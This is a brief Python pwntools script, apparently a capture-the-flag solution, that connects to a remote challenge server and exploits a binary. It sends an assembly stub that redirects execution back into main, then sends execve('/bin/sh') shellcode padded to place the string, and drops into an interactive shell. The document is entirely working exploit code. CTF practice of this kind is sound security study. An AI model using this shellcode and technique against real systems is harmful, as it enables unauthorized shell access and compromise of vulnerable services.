from pwn import *

# p = process('./out')
p = remote('tjc.tf', 31456)
e = ELF('./out')
context.arch = 'amd64'

payload = f'''
    neg rdi
    mov rdx, {e.symbols['main']+24}
    jmp rdx
'''

shellcode = f'''
    mov rdi, rdx
    add rdi, 0x30
    xor esi, esi
    xor edx, edx
    mov rax, {constants.SYS_execve}
    syscall
'''
shellcode = asm(shellcode)
shellcode = shellcode.ljust(0x30, b'\0')
shellcode += b'/bin/sh\0'

p.sendline(asm(payload))
p.sendline(shellcode)
p.interactive()
